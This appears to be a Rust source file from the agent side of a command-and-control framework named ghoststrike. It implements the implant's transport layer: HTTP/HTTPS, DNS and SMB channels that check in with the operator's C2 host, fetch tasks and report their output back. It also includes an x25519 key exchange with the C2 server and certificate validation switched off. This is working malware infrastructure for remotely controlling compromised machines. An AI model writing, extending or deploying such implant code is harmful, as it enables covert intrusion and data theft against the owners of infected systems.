mod dns;
mod http;
mod smb;

use anyhow::Result;
use uuid::Uuid;
use ghoststrike_common::{
    AgentCheckinReq, AgentCheckinResp, KeyExchangeReq, ListenerProtocol,
    SessionKey, Task, TaskResultReq, x25519_generate, x25519_session_key,
};
use crate::config::AgentConfig;

pub struct Transport {
    inner: Box<dyn TransportInner + Send + Sync>,
}

#[async_trait::async_trait]
trait TransportInner {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp>;
    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()>;
}

impl Transport {
    pub async fn new(cfg: &AgentConfig, agent_id: Uuid) -> Result<Self> {
        // Derive session key: prefer ECDH if server_pubkey is set, else static c2_key.
        let session_key = if !cfg.server_pubkey.is_empty() {
            Some(ecdh_handshake(cfg, agent_id).await?)
        } else if !cfg.c2_key.is_empty() {
            let raw = hex::decode(&cfg.c2_key)
                .map_err(|_| anyhow::anyhow!("invalid c2_key hex"))?;
            Some(SessionKey::from_bytes(&raw).map_err(|e| anyhow::anyhow!("{e}"))?)
        } else {
            None
        };

        let inner: Box<dyn TransportInner + Send + Sync> = match cfg.protocol {
            ListenerProtocol::Http | ListenerProtocol::Https => {
                Box::new(http::HttpTransport::new(cfg, session_key)?)
            }
            ListenerProtocol::Dns => {
                Box::new(dns::DnsTransport::new(cfg)?)
            }
            ListenerProtocol::Smb => {
                Box::new(smb::SmbTransport::new(cfg)?)
            }
        };
        Ok(Self { inner })
    }

    pub async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        self.inner.checkin(req).await
    }

    pub async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        self.inner.report_task(agent_id, task, output).await
    }
}

/// Perform x25519 ECDH handshake with the server and derive an AES-GCM session key.
async fn ecdh_handshake(cfg: &AgentConfig, agent_id: Uuid) -> Result<SessionKey> {
    // Parse baked-in server pubkey.
    let server_pub_bytes = hex::decode(&cfg.server_pubkey)
        .map_err(|_| anyhow::anyhow!("invalid server_pubkey hex"))?;

    // Generate our ephemeral keypair.
    let (priv_bytes, pub_bytes) = x25519_generate();

    // POST agent's ephemeral pubkey to /api/keyex.
    let scheme = match cfg.protocol {
        ListenerProtocol::Https => "https",
        _                       => "http",
    };
    let url = format!("{}://{}:{}/api/keyex", scheme, cfg.c2_host, cfg.c2_port);
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let req = KeyExchangeReq { agent_id, agent_pubkey: pub_bytes.to_vec() };
    let resp = client.post(&url).json(&req).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow::anyhow!("keyex failed: HTTP {}", resp.status()));
    }

    // Derive shared session key from our ephemeral priv + server static pub.
    x25519_session_key(priv_bytes, &server_pub_bytes)
        .map_err(|e| anyhow::anyhow!("ECDH: {e}"))
}
